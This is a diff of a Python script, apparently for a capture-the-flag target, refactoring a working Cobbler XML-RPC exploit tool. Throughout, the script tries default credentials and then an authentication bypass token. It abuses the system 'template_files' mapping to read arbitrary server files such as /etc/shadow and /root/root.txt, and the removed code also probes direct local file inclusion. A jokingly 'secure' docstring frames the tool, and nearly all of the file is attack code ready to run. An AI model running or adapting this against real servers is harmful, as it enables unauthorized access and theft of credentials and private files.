@@ -1,452 +1,447 @@
 #!/usr/bin/env python3
 """
-Improved Cobbler XML-RPC Enumeration & Exploitation Script
-Focuses on working template_files exploit since direct get_file() is broken
+Consolidated Cobbler XML-RPC Exploitation Tool
+Clean, typed, SECURE implementation with proper output validation ..lol..
 """
-import xmlrpc.client, re, sys, time, argparse
+import xmlrpc.client
+import re
+import sys
+import time
+import argparse
+import os
+from typing import Dict, List, Tuple, Optional, Any, Union
+from urllib.parse import urlparse
 
-DEFAULT_HOST = "127.0.0.1:25151"
-DEFAULT_USER = "cobbler"
-DEFAULT_PASS = "cobbler"
+class CobblerExploit:
+    """Secure Cobbler XML-RPC exploitation class"""
+    
+    def __init__(self, target: str, username: str = "cobbler", password: str = "cobbler"):
+        self.target = self._sanitize_target(target)
+        self.username = username
+        self.password = password
+        self.server = self._create_server()
+        self.token: Optional[str] = None
+        self.auth_method: Optional[str] = None
+        
+    def _sanitize_target(self, target: str) -> str:
+        """Securely sanitize and validate target URL"""
+        if not target:
+            raise ValueError("Target cannot be empty")
+            
+        # Basic URL validation
+        if not re.match(r'^[\w\.-]+:\d+$|^https?://', target):
+            raise ValueError("Invalid target format")
+            
+        if "://" not in target:
+            target = f"http://{target}/RPC2"
+        elif not target.endswith("/RPC2"):
+            target = target.rstrip("/") + "/RPC2"
+            
+        # Parse and validate
+        parsed = urlparse(target)
+        if not parsed.hostname:
+            raise ValueError("Invalid hostname in target")
+            
+        return target
+    
+    def _create_server(self) -> xmlrpc.client.ServerProxy:
+        """Create XML-RPC server proxy with timeout"""
+        return xmlrpc.client.ServerProxy(self.target, allow_none=True)
+    
+    def authenticate(self, quiet: bool = False) -> bool:
+        """Authenticate with target server"""
+        # Try credential authentication first
+        try:
+            self.token = self.server.login(self.username, self.password)
+            self.auth_method = "credentials"
+            if not quiet:
+                print(f"[+] Authenticated with credentials: {self.username}")
+            return True
+        except Exception as cred_error:
+            if not quiet:
+                print(f"[-] Credential auth failed: {cred_error}")
+        
+        # Try bypass authentication
+        try:
+            self.token = self.server.login("", -1)
+            self.auth_method = "bypass"
+            if not quiet:
+                print("[+] Authenticated with bypass token")
+            return True
+        except Exception as bypass_error:
+            if not quiet:
+                print(f"[-] Bypass auth failed: {bypass_error}")
+            return False
+    
+    def discover_info(self, quiet: bool = False) -> Dict[str, Any]:
+        """Discover server capabilities and existing objects"""
+        info = {
+            'version': None,
+            'methods': [],
+            'distros': [],
+            'kernel_candidates': []
+        }
+        
+        # Version detection
+        try:
+            info['version'] = self.server.version()
+        except Exception:
+            pass
+        
+        # Method discovery
+        test_methods = [
+            "get_template_file_for_system", "get_distros", "get_profiles", 
+            "new_distro", "new_profile", "new_system", "sync"
+        ]
+        
+        for method in test_methods:
+            if hasattr(self.server, method):
+                info['methods'].append(method)
+        
+        # Get existing distros for kernel discovery
+        try:
+            distros = self.server.get_distros(self.token)
+            info['distros'] = distros
+            
+            # Extract kernel/initrd paths from existing distros
+            for distro in distros:
+                if isinstance(distro, dict):
+                    kernel = distro.get('kernel')
+                    initrd = distro.get('initrd')
+                    if kernel and initrd:
+                        info['kernel_candidates'].append((kernel, initrd))
+        except Exception:
+            pass
+        
+        if not quiet:
+            print(f"[+] Server version: {info['version'] or 'Unknown'}")
+            print(f"[+] Available methods: {len(info['methods'])}")
+            print(f"[+] Existing distros: {len(info['distros'])}")
+            print(f"[+] Kernel candidates: {len(info['kernel_candidates'])}")
+        
+        return info
+    
+    def _get_kernel_initrd(self, kernel: Optional[str] = None, 
+                          initrd: Optional[str] = None, 
+                          info: Optional[Dict] = None) -> Tuple[Optional[str], Optional[str]]:
+        """Get usable kernel and initrd paths"""
+        if kernel and initrd:
+            return kernel, initrd
+        
+        # Use discovered candidates
+        if info and info['kernel_candidates']:
+            return info['kernel_candidates'][0]
+        
+        # Common fallback paths
+        common_pairs = [
+            ("/boot/vmlinuz-6.1.0-37-amd64", "/boot/initrd.img-6.1.0-37-amd64"),
+            ("/boot/vmlinuz-5.15.0-generic", "/boot/initrd.img-5.15.0-generic"),
+            ("/boot/vmlinuz", "/boot/initrd.img"),
+        ]
+        
+        return common_pairs[0]
+    
+    def _sanitize_filepath(self, filepath: str) -> str:
+        """Sanitize file path for security"""
+        if not filepath:
+            raise ValueError("File path cannot be empty")
+        
+        # Basic path validation - allow absolute paths for system files
+        if not filepath.startswith('/'):
+            raise ValueError("Only absolute paths allowed")
+        
+        # Prevent some dangerous patterns
+        dangerous = ['..', '\\', '\x00', '\r', '\n']
+        for danger in dangerous:
+            if danger in filepath:
+                raise ValueError(f"Dangerous character/pattern in path: {danger}")
+        
+        return filepath
+    
+    def read_file(self, filepath: str, kernel: Optional[str] = None, 
+                  initrd: Optional[str] = None, quiet: bool = False) -> Optional[str]:
+        """Read file using template_files exploit"""
+        
+        if not self.token:
+            raise RuntimeError("Not authenticated")
+        
+        filepath = self._sanitize_filepath(filepath)
+        
+        # Get kernel/initrd
+        if not kernel or not initrd:
+            info = self.discover_info(quiet=True)
+            kernel, initrd = self._get_kernel_initrd(kernel, initrd, info)
+        
+        if not kernel or not initrd:
+            if not quiet:
+                print("[-] No usable kernel/initrd available")
+            return None
+        
+        try:
+            # Generate unique object names
+            timestamp = int(time.time())
+            suffix = hash(filepath) % 10000
+            
+            names = {
+                'distro': f"exp_d_{timestamp}_{suffix}",
+                'profile': f"exp_p_{timestamp}_{suffix}", 
+                'system': f"exp_s_{timestamp}_{suffix}",
+                'dest': f"/exp_{timestamp}_{suffix}"
+            }
+            
+            if not quiet:
+                print(f"[*] Creating exploit objects for {filepath}...")
+            
+            # Create distro
+            distro_id = self.server.new_distro(self.token)
+            self.server.modify_distro(distro_id, "name", names['distro'], self.token)
+            self.server.modify_distro(distro_id, "breed", "redhat", self.token)
+            self.server.modify_distro(distro_id, "arch", "x86_64", self.token)
+            self.server.modify_distro(distro_id, "kernel", kernel, self.token)
+            self.server.modify_distro(distro_id, "initrd", initrd, self.token)
+            self.server.save_distro(distro_id, self.token)
+            
+            # Create profile
+            profile_id = self.server.new_profile(self.token)
+            self.server.modify_profile(profile_id, "name", names['profile'], self.token)
+            self.server.modify_profile(profile_id, "distro", names['distro'], self.token)
+            self.server.save_profile(profile_id, self.token)
+            
+            # Create system with template mapping
+            system_id = self.server.new_system(self.token)
+            self.server.modify_system(system_id, "name", names['system'], self.token)
+            self.server.modify_system(system_id, "profile", names['profile'], self.token)
+            self.server.modify_system(system_id, "template_files", 
+                                    {filepath: names['dest']}, self.token)
+            self.server.save_system(system_id, self.token)
+            
+            # Sync configuration
+            try:
+                self.server.sync(self.token)
+            except Exception:
+                pass  # Non-critical
+            
+            # Attempt to read the file
+            for use_token in [False, True]:
+                try:
+                    if use_token:
+                        data = self.server.get_template_file_for_system(
+                            names['system'], names['dest'], self.token)
+                    else:
+                        data = self.server.get_template_file_for_system(
+                            names['system'], names['dest'])
+                    
+                    if data and isinstance(data, str):
+                        if not quiet:
+                            print(f"[+] Successfully read {filepath} ({len(data)} bytes)")
+                        return data
+                        
+                except Exception:
+                    continue
+            
+            if not quiet:
+                print(f"[-] Failed to read {filepath}")
+            return None
+            
+        except Exception as e:
+            if not quiet:
+                print(f"[-] Exploit error for {filepath}: {e}")
+            return None
+    
+    def read_multiple_files(self, filepaths: List[str], **kwargs) -> Dict[str, str]:
+        """Read multiple files efficiently"""
+        results = {}
+        quiet = kwargs.get('quiet', False)
+        
+        for filepath in filepaths:
+            if not quiet:
+                print(f"[*] Reading {filepath}...")
+            
+            data = self.read_file(filepath, quiet=True, **kwargs)
+            if data:
+                results[filepath] = data
+                if not quiet:
+                    print(f"[+] Success: {len(data)} bytes")
+            elif not quiet:
+                print("[-] Failed")
+        
+        return results
 
-def parse_args():
-    parser = argparse.ArgumentParser(description='Cobbler XML-RPC Enumeration & Exploitation')
+def validate_output_file(output_file: str) -> str:
+    """SECURELY validate output file to prevent overwriting system files"""
     
-    parser.add_argument('target', nargs='?', default=DEFAULT_HOST,
-                       help='Target host:port (default: 127.0.0.1:25151)')
+    # Get absolute path
+    abs_path = os.path.abspath(output_file)
     
-    # Main operations
-    parser.add_argument('--read-file', metavar='PATH',
-                       help='Read specific file using template exploit')
+    # DANGEROUS system directories/files to protect
+    dangerous_paths = [
+        '/etc/', '/bin/', '/sbin/', '/usr/bin/', '/usr/sbin/',
+        '/boot/', '/root/', '/home/', '/var/log/', '/proc/', '/sys/',
+        '/dev/', '/tmp/shadow', '/tmp/passwd'  # Even temp versions
+    ]
+    
+    dangerous_files = [
+        'passwd', 'shadow', 'sudoers', 'ssh_host_key', 'id_rsa',
+        'authorized_keys', '.bashrc', '.bash_profile', '.profile'
+    ]
+    
+    # Check if trying to write to dangerous directories
+    for dangerous_path in dangerous_paths:
+        if abs_path.startswith(dangerous_path):
+            raise ValueError(f"DENIED: Cannot write to system directory {dangerous_path}")
+    
+    # Check for dangerous filenames
+    filename = os.path.basename(abs_path).lower()
+    for dangerous_file in dangerous_files:
+        if dangerous_file in filename:
+            raise ValueError(f"DENIED: Cannot write to file containing '{dangerous_file}'")
+    
+    # Must be in current directory or explicitly safe subdirectory
+    current_dir = os.getcwd()
+    if not abs_path.startswith(current_dir):
+        # Allow explicit safe subdirectories
+        safe_dirs = ['/tmp/cobbler_output', '/home/' + os.getenv('USER', 'unknown')]
+        if not any(abs_path.startswith(safe) for safe in safe_dirs):
+            raise ValueError(f"DENIED: Output must be in current directory or safe location")
+    
+    # Final filename validation
+    if not re.match(r'^[\w\.-]+$', os.path.basename(abs_path)):
+        raise ValueError("DENIED: Invalid characters in filename")
+    
+    # Check if file already exists and is important
+    if os.path.exists(abs_path):
+        print(f"[!] WARNING: File {abs_path} already exists!")
+        response = input("Do you want to overwrite it? [y/N]: ").lower().strip()
+        if response not in ['y', 'yes']:
+            raise ValueError("User cancelled overwrite")
+    
+    return abs_path
+
+def parse_arguments() -> argparse.Namespace:
+    """Parse command line arguments"""
+    parser = argparse.ArgumentParser(
+        description='Consolidated Cobbler XML-RPC Exploitation Tool',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s 127.0.0.1:25151 --read-file /root/root.txt
+  %(prog)s target.com:25151 --read-files /etc/passwd /etc/shadow
+  %(prog)s 192.168.1.10:25151 --enum-only
+  %(prog)s 127.0.0.1:25151 --read-file /etc/passwd -o safe_output.txt
+
+SECURITY NOTE: Output files are restricted to current directory for safety!
+        """
+    )
+    
+    parser.add_argument('target', help='Target host:port')
+    parser.add_argument('--read-file', metavar='PATH', 
+                       help='Read single file')
     parser.add_argument('--read-files', metavar='PATH', nargs='+',
-                       help='Read multiple files using template exploit')
-    
-    # Discovery options
+                       help='Read multiple files')
     parser.add_argument('--enum-only', action='store_true',
-                       help='Only enumerate methods/settings, no file reading')
-    parser.add_argument('--find-kernels', action='store_true',
-                       help='Search for usable kernels/initrds')
-    parser.add_argument('--test-lfi', action='store_true',
-                       help='Test if direct get_file() LFI works')
-    
-    # Kernel specification (bypass discovery)
+                       help='Only enumerate, no file reading')
     parser.add_argument('--kernel', metavar='PATH',
-                       help='Specify kernel path (bypass discovery)')
-    parser.add_argument('--initrd', metavar='PATH', 
-                       help='Specify initrd path (bypass discovery)')
-    
-    # Auth options
-    parser.add_argument('-u', '--username', default=DEFAULT_USER)
-    parser.add_argument('-p', '--password', default=DEFAULT_PASS)
-    
-    # Output options
-    parser.add_argument('--quiet', '-q', action='store_true')
-    parser.add_argument('--output', '-o', metavar='FILE',
-                       help='Save output to file')
-    parser.add_argument('--debug', action='store_true')
+                       help='Specify kernel path')
+    parser.add_argument('--initrd', metavar='PATH',
+                       help='Specify initrd path')
+    parser.add_argument('-u', '--username', default='cobbler',
+                       help='Username (default: cobbler)')
+    parser.add_argument('-p', '--password', default='cobbler', 
+                       help='Password (default: cobbler)')
+    parser.add_argument('-o', '--output', metavar='FILE',
+                       help='Save results to file (current directory only!)')
+    parser.add_argument('-q', '--quiet', action='store_true',
+                       help='Quiet mode')
     
     return parser.parse_args()
 
-def sp(url):
-    if "://" not in url:
-        url = f"http://{url}/RPC2"
-    elif not url.endswith("/RPC2"):
-        url = url.rstrip("/") + "/RPC2"
-    return xmlrpc.client.ServerProxy(url, allow_none=True)
-
-def login_any(server, user, passwd, quiet=False):
+def save_results(results: Dict[str, str], output_file: str) -> None:
+    """Securely save results to file with validation"""
     try:
-        t = server.login(user, passwd)
-        if not quiet:
-            print(f"[+] Authenticated as {user}:{passwd}")
-        return t, "creds"
-    except Exception as e1:
-        try:
-            t = server.login("", -1)
-            if not quiet:
-                print("[+] Authenticated with bypass token (-1)")
-            return t, "bypass"
-        except Exception as e2:
-            raise RuntimeError(f"Login failed - creds:{e1} | bypass:{e2}")
-
-def discover_methods_and_info(server, token, quiet=False):
-    """Quick method discovery and basic info gathering"""
-    info = {
-        'methods': [],
-        'version': None,
-        'settings': None,
-        'existing_objects': {}
-    }
-    
-    # Method discovery
-    common_methods = [
-        "get_file", "get_template_file_for_system", "get_settings",
-        "get_distros", "get_profiles", "get_systems", "version",
-        "new_distro", "new_profile", "new_system", "sync"
-    ]
-    
-    for method in common_methods:
-        try:
-            m = getattr(server, method, None)
-            if m:
-                try:
-                    m()
-                    info['methods'].append((method, "works_no_args"))
-                except Exception as e:
-                    if "takes" in str(e) or "required" in str(e):
-                        info['methods'].append((method, "needs_args"))
-                    elif "unknown remote method" not in str(e).lower():
-                        info['methods'].append((method, "exists"))
-        except Exception:
-            continue
-    
-    # Version info
-    try:
-        info['version'] = server.version()
-    except Exception:
-        pass
-    
-    # Settings
-    try:
-        info['settings'] = server.get_settings(token)
-    except Exception:
-        pass
-    
-    # Existing objects (useful for finding kernels)
-    for obj_type in ['distros', 'profiles', 'systems']:
-        try:
-            objects = getattr(server, f'get_{obj_type}')(token)
-            info['existing_objects'][obj_type] = objects
-        except Exception:
-            pass
-    
-    if not quiet:
-        print(f"[+] Found {len(info['methods'])} XML-RPC methods")
-        if info['version']:
-            print(f"[+] Cobbler version: {info['version']}")
-        print(f"[+] Existing distros: {len(info['existing_objects'].get('distros', []))}")
-        print(f"[+] Existing profiles: {len(info['existing_objects'].get('profiles', []))}")
-        print(f"[+] Existing systems: {len(info['existing_objects'].get('systems', []))}")
-    
-    return info
-
-def test_direct_lfi(server, quiet=False):
-    """Test if direct get_file() LFI works"""
-    if not quiet:
-        print("[*] Testing direct LFI via get_file()...")
-    
-    test_files = ["/etc/passwd", "/proc/version", "/etc/hosts"]
-    working_files = []
-    
-    for filepath in test_files:
-        try:
-            data = server.get_file(filepath)
-            if data and len(data) > 5:  # More than just a single char
-                working_files.append((filepath, len(data)))
-                if not quiet:
-                    print(f"[+] Direct LFI works: {filepath} ({len(data)} bytes)")
-            elif not quiet:
-                print(f"[-] Direct LFI failed: {filepath} (got {len(data) if data else 0} bytes)")
-        except Exception as e:
-            if not quiet:
-                print(f"[-] Direct LFI error: {filepath} - {e}")
-    
-    if working_files:
-        if not quiet:
-            print(f"[!] Direct LFI confirmed - {len(working_files)} files readable")
-        return True
-    else:
-        if not quiet:
-            print("[-] Direct LFI not working (files return minimal data)")
-        return False
-
-def smart_kernel_discovery(server, token, existing_objects, debug=False):
-    """Smart kernel discovery using existing objects and common paths"""
-    
-    if debug:
-        print("[DEBUG] Starting smart kernel discovery...")
-    
-    found_kernels = []
-    found_initrds = []
-    
-    # Method 1: Extract from existing distros
-    existing_distros = existing_objects.get('distros', [])
-    if existing_distros and debug:
-        print(f"[DEBUG] Checking {len(existing_distros)} existing distros...")
-    
-    for distro in existing_distros:
-        if isinstance(distro, dict):
-            kernel = distro.get('kernel')
-            initrd = distro.get('initrd')
-            
-            if kernel and kernel not in [k[0] for k in found_kernels]:
-                # Test if kernel exists by trying to read a small portion
-                try:
-                    # We can't use get_file reliably, so we'll assume existing distro paths are valid
-                    found_kernels.append((kernel, "from_existing_distro"))
-                    if debug:
-                        print(f"[DEBUG] Found kernel from existing distro: {kernel}")
-                except Exception:
-                    pass
-            
-            if initrd and initrd not in [i[0] for i in found_initrds]:
-                try:
-                    found_initrds.append((initrd, "from_existing_distro"))  
-                    if debug:
-                        print(f"[DEBUG] Found initrd from existing distro: {initrd}")
-                except Exception:
-                    pass
-    
-    # Method 2: Common default paths (since we can't easily test them)
-    if not found_kernels:
-        common_kernels = [
-            "/boot/vmlinuz-6.1.0-37-amd64",  # Common Debian/Ubuntu
-            "/boot/vmlinuz-5.15.0-generic",  # Ubuntu 
-            "/boot/vmlinuz-6.1.0-13-amd64",  # Debian
-            "/boot/vmlinuz",                 # Generic
-            "/boot/vmlinuz-linux",           # Arch
-        ]
+        # SECURE validation of output file
+        safe_output_path = validate_output_file(output_file)
         
-        for ck in common_kernels:
-            found_kernels.append((ck, "common_path"))
-            if debug:
-                print(f"[DEBUG] Added common kernel path: {ck}")
-    
-    if not found_initrds:
-        common_initrds = [
-            "/boot/initrd.img-6.1.0-37-amd64",
-            "/boot/initrd.img-5.15.0-generic", 
-            "/boot/initrd.img-6.1.0-13-amd64",
-            "/boot/initrd.img",
-            "/boot/initramfs-linux.img",
-        ]
-        
-        for ci in common_initrds:
-            found_initrds.append((ci, "common_path"))
-            if debug:
-                print(f"[DEBUG] Added common initrd path: {ci}")
-    
-    return found_kernels, found_initrds
-
-def template_exploit_file(server, token, target_file, kernel_path, initrd_path, debug=False):
-    """Use template_files exploit to read a file"""
-    
-    if debug:
-        print(f"[DEBUG] Template exploit for {target_file}")
-        print(f"[DEBUG] Using kernel: {kernel_path}")
-        print(f"[DEBUG] Using initrd: {initrd_path}")
-    
-    try:
-        # Generate unique names
-        timestamp = int(time.time())
-        rand = hash(target_file) % 10000
-        
-        distro_name = f"exp_d_{timestamp}_{rand}"
-        profile_name = f"exp_p_{timestamp}_{rand}"
-        system_name = f"exp_s_{timestamp}_{rand}"
-        dest_path = f"/exp_{timestamp}_{rand}"
-        
-        if debug:
-            print(f"[DEBUG] Creating objects: {distro_name}, {profile_name}, {system_name}")
-        
-        # Create distro
-        did = server.new_distro(token)
-        server.modify_distro(did, "name", distro_name, token)
-        server.modify_distro(did, "breed", "redhat", token)
-        server.modify_distro(did, "arch", "x86_64", token)
-        server.modify_distro(did, "kernel", kernel_path, token)
-        server.modify_distro(did, "initrd", initrd_path, token)
-        server.save_distro(did, token)
-        
-        # Create profile
-        pid = server.new_profile(token)
-        server.modify_profile(pid, "name", profile_name, token)
-        server.modify_profile(pid, "distro", distro_name, token)
-        server.save_profile(pid, token)
-        
-        # Create system with template mapping
-        sid = server.new_system(token)
-        server.modify_system(sid, "name", system_name, token)
-        server.modify_system(sid, "profile", profile_name, token)
-        server.modify_system(sid, "template_files", {target_file: dest_path}, token)
-        server.save_system(sid, token)
-        
-        if debug:
-            print("[DEBUG] Running sync...")
-        
-        # Sync
-        try:
-            sync_result = server.sync(token)
-            if debug:
-                print(f"[DEBUG] Sync result: {sync_result}")
-        except Exception as e:
-            if debug:
-                print(f"[DEBUG] Sync failed (non-fatal): {e}")
-        
-        # Try to read the mapped file
-        for use_token in [False, True]:
-            try:
-                if use_token:
-                    data = server.get_template_file_for_system(system_name, dest_path, token)
-                else:
-                    data = server.get_template_file_for_system(system_name, dest_path)
-                
-                if data and isinstance(data, str) and len(data) > 0:
-                    if debug:
-                        print(f"[DEBUG] Template read successful (token={use_token}): {len(data)} bytes")
-                    return data
-                    
-            except Exception as e:
-                if debug:
-                    print(f"[DEBUG] Template read failed (token={use_token}): {e}")
-                continue
-        
-        return None
-        
-    except Exception as e:
-        if debug:
-            print(f"[DEBUG] Template exploit failed: {e}")
-        return None
-
-def main():
-    args = parse_args()
-    
-    if not args.quiet:
-        print(f"[*] Cobbler Exploitation Tool - Target: {args.target}")
-        print("=" * 60)
-    
-    server = sp(args.target)
-    
-    # Authentication
-    try:
-        token, auth_method = login_any(server, args.username, args.password, args.quiet)
-        if not args.quiet:
-            print(f"[+] Auth: {token[:20]}... (via {auth_method})\n")
-    except Exception as e:
-        print(f"[-] Auth failed: {e}")
-        return 1
-    
-    # Enumeration phase
-    if not args.quiet or args.enum_only:
-        print("[*] Gathering server information...")
-    
-    info = discover_methods_and_info(server, token, args.quiet)
-    
-    if args.test_lfi:
-        lfi_works = test_direct_lfi(server, args.quiet)
-    
-    if args.enum_only:
-        print("\n[*] Enumeration complete")
-        return 0
-    
-    # Kernel discovery
-    kernel_path = args.kernel
-    initrd_path = args.initrd
-    
-    if not (kernel_path and initrd_path):
-        if not args.quiet:
-            print("[*] Discovering kernel/initrd paths...")
-        
-        kernels, initrds = smart_kernel_discovery(server, token, info['existing_objects'], args.debug)
-        
-        if kernels and initrds:
-            kernel_path = kernels[0][0]
-            initrd_path = initrds[0][0]
-            if not args.quiet:
-                print(f"[+] Using kernel: {kernel_path}")
-                print(f"[+] Using initrd: {initrd_path}")
-        else:
-            print("[-] No usable kernel/initrd found")
-            if args.find_kernels:
-                return 0
-            print("[-] Specify --kernel and --initrd manually")
-            return 1
-    
-    if args.find_kernels:
-        print(f"\n[+] Found kernels:")
-        for k, source in kernels:
-            print(f"    {k} ({source})")
-        print(f"[+] Found initrds:")  
-        for i, source in initrds:
-            print(f"    {i} ({source})")
-        return 0
-    
-    # File reading operations
-    results = {}
-    
-    if args.read_file:
-        if not args.quiet:
-            print(f"\n[*] Reading {args.read_file}...")
-        
-        data = template_exploit_file(server, token, args.read_file, 
-                                   kernel_path, initrd_path, args.debug)
-        if data:
-            results[args.read_file] = data
-            if not args.output and not args.quiet:
-                print(f"\n{'='*60}")
-                print(f"CONTENT OF {args.read_file}:")
-                print('='*60)
-                print(data, end="" if data.endswith('\n') else '\n')
-                print('='*60)
-        else:
-            print(f"[-] Failed to read {args.read_file}")
-    
-    elif args.read_files:
-        if not args.quiet:
-            print(f"\n[*] Reading {len(args.read_files)} files...")
-        
-        for filepath in args.read_files:
-            if not args.quiet:
-                print(f"[*] Reading {filepath}...")
-            
-            data = template_exploit_file(server, token, filepath,
-                                       kernel_path, initrd_path, args.debug)
-            if data:
-                results[filepath] = data
-                print(f"[+] Success: {filepath} ({len(data)} bytes)")
-            else:
-                print(f"[-] Failed: {filepath}")
-        
-        # Show results
-        if results and not args.output:
+        with open(safe_output_path, 'w', encoding='utf-8') as f:
             for filepath, content in results.items():
-                print(f"\n{'='*60}")
-                print(f"CONTENT OF {filepath}:")
-                print('='*60)
-                print(content, end="" if content.endswith('\n') else '\n')
-                print('='*60)
-    
-    else:
-        # Default: read /etc/passwd as demo
-        if not args.quiet:
-            print(f"\n[*] Demo: reading /etc/passwd...")
+                f.write(f"=== {filepath} ===\n")
+                f.write(content)
+                if not content.endswith('\n'):
+                    f.write('\n')
+                f.write(f"=== END {filepath} ===\n\n")
         
-        data = template_exploit_file(server, token, "/etc/passwd",
-                                   kernel_path, initrd_path, args.debug)
-        if data:
-            results["/etc/passwd"] = data
-            print(f"[+] Success! Read /etc/passwd ({len(data)} bytes)")
-            if not args.quiet:
-                print(f"Preview: {data[:100]}...")
+        print(f"[+] Results safely saved to {safe_output_path}")
+        
+    except Exception as e:
+        print(f"[-] Failed to save results: {e}")
+        print(f"[!] For security, output is restricted to current directory")
+
+def main() -> int:
+    """Main execution function"""
+    try:
+        args = parse_arguments()
+        
+        if not args.quiet:
+            print(f"[*] Cobbler Exploit Tool - Target: {args.target}")
+            print("=" * 50)
+        
+        # Initialize exploiter
+        exploiter = CobblerExploit(args.target, args.username, args.password)
+        
+        # Authenticate
+        if not exploiter.authenticate(args.quiet):
+            print("[-] Authentication failed")
+            return 1
+        
+        # Enumeration
+        info = exploiter.discover_info(args.quiet)
+        
+        if args.enum_only:
+            return 0
+        
+        # File operations
+        results = {}
+        
+        if args.read_file:
+            data = exploiter.read_file(args.read_file, args.kernel, args.initrd, args.quiet)
+            if data:
+                results[args.read_file] = data
+        
+        elif args.read_files:
+            results = exploiter.read_multiple_files(
+                args.read_files, kernel=args.kernel, initrd=args.initrd, quiet=args.quiet)
+        
         else:
-            print("[-] Demo failed")
-    
-    # Save results
-    if args.output and results:
-        try:
-            with open(args.output, 'w') as f:
-                for filepath, content in results.items():
-                    f.write(f"=== {filepath} ===\n")
-                    f.write(content)
-                    f.write(f"\n=== END {filepath} ===\n\n")
-            print(f"[+] Saved to {args.output}")
-        except Exception as e:
-            print(f"[-] Save failed: {e}")
-    
-    if not args.quiet:
-        print(f"\n[+] Successfully read {len(results)} file(s)")
-    
-    return 0
+            # Default demo
+            if not args.quiet:
+                print("\n[*] Demo: Reading /etc/passwd")
+            data = exploiter.read_file("/etc/passwd", args.kernel, args.initrd, args.quiet)
+            if data:
+                results["/etc/passwd"] = data
+        
+        # Display results
+        if results and not args.output and not args.quiet:
+            for filepath, content in results.items():
+                print(f"\n{'='*50}")
+                print(f"CONTENT OF {filepath}:")
+                print('='*50)
+                print(content, end="" if content.endswith('\n') else '\n')
+                print('='*50)
+        
+        # Save results SECURELY
+        if args.output and results:
+            save_results(results, args.output)
+        
+        if not args.quiet:
+            print(f"\n[+] Successfully read {len(results)} file(s)")
+        
+        return 0
+        
+    except KeyboardInterrupt:
+        print("\n[-] Interrupted by user")
+        return 1
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return 1
 
 if __name__ == "__main__":
     sys.exit(main())
